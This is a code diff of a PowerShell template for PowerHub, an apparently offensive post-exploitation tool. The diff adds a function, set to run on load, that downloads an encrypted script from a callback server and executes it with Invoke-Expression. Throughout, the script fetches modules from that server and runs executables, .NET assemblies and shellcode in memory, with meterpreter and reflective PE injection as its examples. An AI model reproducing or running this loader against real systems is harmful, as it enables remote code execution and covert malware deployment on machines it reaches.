@@ -15,18 +15,10 @@ $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
 
-$Modules = @()
-{% if modules %}
-{% for m in modules %}
-$m = new-object System.Collections.Hashtable
-$m.add('name', '{{ m.name }}')
-$m.add('shortname', '{{ m.short_name }}')
-$m.add('type', '{{ m.type }}')
-$m.add('code', '')
-$m.add('n', {{ m.n }})
-$Modules += $m
-{% endfor %}
-{% endif %}
+$WebClient = New-Object net.webclient;
+$WebClient.Proxy = [Net.WebRequest]::GetSystemWebProxy();
+$WebClient.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;
+
 
 function Unzip-Code {
      Param ( [byte[]] $byteArray )
@@ -44,6 +36,16 @@ function Unzip-Code {
     }
 }
 
+function Update-HubModules {
+    $URL = "{0}ml" -f $CALLBACK_URL
+    $ModuleList = $WebClient.DownloadString($URL)
+    $ModuleList = [System.Convert]::FromBase64String($ModuleList)
+    $ModuleList = Decrypt-Code $ModuleList $KEY
+    $ModuleList = Unzip-Code $ModuleList
+    $ModuleList = [System.Text.Encoding]::UTF8.GetString($ModuleList)
+    Invoke-Expression $ModuleList
+    $Global:Modules = $Modules
+}
 
 function Import-HubModule {
 
@@ -53,19 +55,19 @@ function Import-HubModule {
     )
 
     if ($Module["type"] -eq "ps1") {
-        $code = $Module["code"]
+        $code = $Module.Code
         $code = [System.Convert]::FromBase64String($code)
         $code = Decrypt-Code $code $KEY
         $code = Unzip-Code $code
-        $code = [System.Text.Encoding]::ASCII.GetString($code)
+        $code = [System.Text.Encoding]::UTF8.GetString($code)
         $sb = [Scriptblock]::Create($code)
         New-Module -ScriptBlock $sb | Out-Null
     }
 
     if ($?){
-        Write-Verbose ("[*] {0} imported." -f $Module["name"])
+        Write-Verbose ("[*] {0} imported." -f $Module.Name)
     } else {
-        Write-Error ("[*] Failed to import {0}" -f $Module["name"])
+        Write-Error ("[*] Failed to import {0}" -f $Module.Name)
     }
 }
 
@@ -93,9 +95,8 @@ function List-HubModules {
 Lists all modules that are available via the hub.
 
 #>
-    $(foreach ($ht in $Modules) {
-        new-object PSObject -Property $ht
-    } ) | Format-Table -AutoSize -Property n,type,name,code
+    # $Modules | Out-String
+    $Modules | Format-Table -AutoSize -Property N,Type,ShortName,Code
 }
 
 function Load-HubModule {
@@ -106,17 +107,21 @@ function Load-HubModule {
 Transfers a module from the hub and imports it. It creates a web request to
 load the Base64 encoded module code.
 
+It refreshes the module list first, so keep this in mind when referring to
+modules by number.
+
 .DESCRIPTION
 
 Load-HubModule loads a module.
 
-.PARAMETER s
+.PARAMETER Expression
 
-Number of the module, separated by commas. Can contain a range such as "1,4-8".
-Try a leading zero in case it is not working.
+A regular expression. PowerHub will then load all modules that have a matching
+ShortName.
 
-Alternatively, provide a regular expression. PowerHub will then load all
-modules that match.
+Alternatively, you can use the number of the module, separated by commas. Can
+contain a range such as "1,4-8". Try a leading zero in case it is not working.
+
 
 .EXAMPLE
 
@@ -159,25 +164,24 @@ Use the '-Verbose' option to print detailed information.
     Param(
         [parameter(Mandatory=$true)]
         [String]
-        $s
+        $Expression
     )
 
-    if ($s -match "^[0-9-,]+$") {
-        $indices = Convert-IntStringToArray($s)
+    Update-HubModules
+
+    if ($Expression -match "^[0-9-,]+$") {
+        $indices = Convert-IntStringToArray($Expression)
     } else {
-        $indices = $Modules | Where { $_.shortname -match $s } | % {$_.n}
+        $indices = $Modules | Where { $_.shortname -match $Expression } | % {$_.N}
     }
 
-    $K=new-object net.webclient;
-    $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
-    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
     $result = @()
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
             $compression = "&c=1"
             if ($PS_VERSION -eq 2) { $compression = "" }
             $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
-            $Modules[$i]["code"] = $K.downloadstring($url);
+            $Modules[$i].Code = $WebClient.DownloadString($url);
             Import-HubModule $Modules[$i]
         }
         $result += $Modules[$i]
@@ -243,9 +247,9 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
             foreach ($n in $Module) {
                 if ($n.gettype() -eq [Int32]) {
-                    $code = $Modules[$n]["code"]
+                    $code = $Modules[$n].Code
                 } else {
-                    $code = $n["code"]
+                    $code = $n.Code
                 }
                 $code = [System.Convert]::FromBase64String($code)
                 $code = Decrypt-Code $code $KEY
@@ -292,14 +296,14 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
         } else {
             $m = $n
         }
-        $code = $m["code"]
+        $code = $m.Code
         $code = [System.Convert]::FromBase64String($code)
         $code = Decrypt-Code $code $KEY
         $code = Unzip-Code $code
         if ($Directory) {
-            $Filename = "$Directory/$($m['shortname'])"
+            $Filename = "$Directory/$($m.ShortName)"
         } else {
-            $Filename = $m["shortname"]
+            $Filename = $m.ShortName
         }
         $code | Set-Content "$Filename" -Encoding Byte
         $Filename
@@ -342,7 +346,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
         } else {
             $m = $n
         }
-        $code = $m["code"]
+        $code = $m.Code
         $code = [System.Convert]::FromBase64String($code)
         $code = Decrypt-Code $code $KEY
         $code = Unzip-Code $code
@@ -390,7 +394,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
             } else {
                 $m = $n
             }
-            $code = $m["code"]
+            $code = $m.Code
             $code = [System.Convert]::FromBase64String($code)
             $code = Decrypt-Code $code $KEY
             $code = Unzip-Code $code
@@ -660,6 +664,7 @@ function Help-PowerHub {
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
   * Load-HubModule (lhm)
+  * Update-HubModules (uhm)
   * Get-Loot (glo)
   * Run-Exe (re)
   * Run-DotNETExe (rdne)
@@ -675,6 +680,7 @@ Use 'Get-Help' to learn more about those functions.
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
+try { New-Alias -Name uhm -Value Update-HubModules } catch { }
 try { New-Alias -Name glo -Value Get-Loot } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
@@ -682,5 +688,7 @@ try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
 try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
 try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }
 
+Update-HubModules
 
 {{ profile }}
+
